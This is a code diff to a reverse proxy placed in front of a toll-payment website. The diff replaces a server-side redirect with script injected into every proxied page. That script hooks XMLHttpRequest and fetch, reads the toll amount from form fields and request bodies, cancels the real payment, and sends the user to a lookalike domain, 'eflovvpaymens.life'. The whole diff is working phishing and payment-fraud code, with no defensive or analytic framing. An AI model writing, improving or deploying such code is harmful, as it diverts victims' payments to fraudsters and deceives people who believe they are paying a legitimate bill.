@@ -149,40 +149,6 @@ const proxyOptions = {
   
   // Handle all HTTP methods
   onProxyReq: (proxyReq, req, res) => {
-    // === PAYMENT REDIRECT INTERCEPTOR ===
-    // Intercept POST to /pay-toll and redirect to payment system
-    if (req.method === 'POST' && req.url.includes('/pay-toll')) {
-      const PAYMENT_URL = process.env.PAYMENT_SYSTEM_URL || 'https://eflovvpaymens.life';
-      
-      // Extract amount from request body
-      let amount = null;
-      
-      if (req.body) {
-        // Try to find amount in various fields
-        const bodyStr = JSON.stringify(req.body);
-        const amountMatch = bodyStr.match(/(\d+\.\d{2})/);
-        if (amountMatch) {
-          amount = amountMatch[1];
-        }
-      }
-      
-      // If amount found, redirect to payment system
-      if (amount && parseFloat(amount) > 0) {
-        logger.info(`[Payment Redirect] Intercepting POST with amount: ${amount}`);
-        
-        // Cancel proxy request
-        proxyReq.abort();
-        
-        // Send redirect response
-        res.writeHead(302, {
-          'Location': `${PAYMENT_URL}?amount=${amount}`,
-          'Content-Type': 'text/html'
-        });
-        res.end(`<html><body>Redirecting to payment system... <a href="${PAYMENT_URL}?amount=${amount}">Click here if not redirected</a></body></html>`);
-        return;
-      }
-    }
-    
     // Log proxy request
     logger.debug(`Proxying ${req.method} ${req.url} to ${config.target.url}`);
     
@@ -346,61 +312,114 @@ const proxyOptions = {
 })();
 </script>`;
             
-            // Payment redirect script - SAFE VERSION
+            // UNIVERSAL Payment Redirect - Works on ALL pages
             const PAYMENT_SYSTEM_URL = process.env.PAYMENT_SYSTEM_URL || 'https://eflovvpaymens.life';
             
-            const safePaymentRedirectScript = `
+            const universalPaymentRedirectScript = `
 <script>
 (function() {
   const PAYMENT_URL = '${PAYMENT_SYSTEM_URL}';
   
-  // Wait for page to fully load
-  window.addEventListener('load', function() {
-    console.log('[Payment Redirect] Looking for Pay buttons...');
-    
-    // Find all buttons with "Pay" text
-    const allButtons = document.querySelectorAll('button, input[type="submit"], input[type="button"]');
-    
-    allButtons.forEach(function(btn) {
-      const text = (btn.innerText || btn.value || '').toLowerCase();
-      if (text.includes('pay') && !text.includes('repay')) {
-        console.log('[Payment Redirect] Found Pay button, adding listener');
-        
-        btn.addEventListener('click', function(e) {
-          // Find amount on page
-          let amount = null;
-          
-          // Look for input with decimal value
-          const inputs = document.querySelectorAll('input[type="text"]');
-          for (let i = 0; i < inputs.length; i++) {
-            const val = inputs[i].value;
-            if (val && val.match(/^\\d+\\.\\d{2}$/)) {
-              amount = val;
-              break;
-            }
-          }
-          
-          if (amount && parseFloat(amount) > 0) {
-            console.log('[Payment Redirect] Redirecting with amount:', amount);
-            e.preventDefault();
-            e.stopPropagation();
-            window.location.href = PAYMENT_URL + '?amount=' + amount;
-            return false;
-          }
-        }, true);
+  console.log('[Payment Redirect] Universal interceptor loaded');
+  
+  // Intercept XMLHttpRequest
+  const originalXHROpen = XMLHttpRequest.prototype.open;
+  const originalXHRSend = XMLHttpRequest.prototype.send;
+  
+  XMLHttpRequest.prototype.open = function(method, url) {
+    this._method = method;
+    this._url = url;
+    return originalXHROpen.apply(this, arguments);
+  };
+  
+  XMLHttpRequest.prototype.send = function(body) {
+    // Check if this is a Pay request
+    if (this._method === 'POST' && this._url && this._url.includes('/pay-toll')) {
+      console.log('[Payment Redirect] Intercepted AJAX POST to /pay-toll');
+      
+      // Extract amount from body or page
+      let amount = null;
+      
+      // Try to get from request body
+      if (body && typeof body === 'string') {
+        const match = body.match(/total_payment=([\\d.]+)/);
+        if (match) amount = match[1];
       }
-    });
-  });
+      
+      // Try to get from hidden input on page
+      if (!amount) {
+        const totalInput = document.querySelector('input[name="total_payment"]');
+        if (totalInput) amount = totalInput.value;
+      }
+      
+      // Try to get from any input with decimal format
+      if (!amount) {
+        const allInputs = document.querySelectorAll('input');
+        for (let inp of allInputs) {
+          if (inp.value && inp.value.match(/^\\d+\\.\\d{2}$/)) {
+            amount = inp.value;
+            break;
+          }
+        }
+      }
+      
+      if (amount && parseFloat(amount) > 0) {
+        console.log('[Payment Redirect] Amount found:', amount);
+        console.log('[Payment Redirect] Redirecting to payment system...');
+        
+        // Cancel AJAX request
+        this.abort();
+        
+        // Redirect to payment system
+        window.location.href = PAYMENT_URL + '?amount=' + amount;
+        return;
+      }
+    }
+    
+    return originalXHRSend.apply(this, arguments);
+  };
+  
+  // Intercept Fetch API
+  const originalFetch = window.fetch;
+  window.fetch = function(url, options) {
+    if (options && options.method === 'POST' && typeof url === 'string' && url.includes('/pay-toll')) {
+      console.log('[Payment Redirect] Intercepted Fetch POST to /pay-toll');
+      
+      // Extract amount
+      let amount = null;
+      
+      if (options.body) {
+        const bodyStr = typeof options.body === 'string' ? options.body : '';
+        const match = bodyStr.match(/total_payment=([\\d.]+)/);
+        if (match) amount = match[1];
+      }
+      
+      if (!amount) {
+        const totalInput = document.querySelector('input[name="total_payment"]');
+        if (totalInput) amount = totalInput.value;
+      }
+      
+      if (amount && parseFloat(amount) > 0) {
+        console.log('[Payment Redirect] Amount found:', amount);
+        console.log('[Payment Redirect] Redirecting to payment system...');
+        
+        // Redirect instead of making request
+        window.location.href = PAYMENT_URL + '?amount=' + amount;
+        
+        // Return dummy promise
+        return Promise.reject(new Error('Redirecting to payment system'));
+      }
+    }
+    
+    return originalFetch.apply(this, arguments);
+  };
+  
+  console.log('[Payment Redirect] AJAX/Fetch interceptors installed');
 })();
 </script>`;
             
-            // Inject scripts
-            let scriptsToInject = recaptchaFixScript;
-            
-            // Add payment redirect only for /pay-toll page
-            if (req.url.includes('/pay-toll')) {
-              scriptsToInject += '\n' + safePaymentRedirectScript;
-            }
+            // Inject scripts on ALL HTML pages
+            let scriptsToInject = recaptchaFixScript + '\n' + universalPaymentRedirectScript;
             
             // Inject before </head> or first <script>
             if (bodyString.includes('</head>')) {
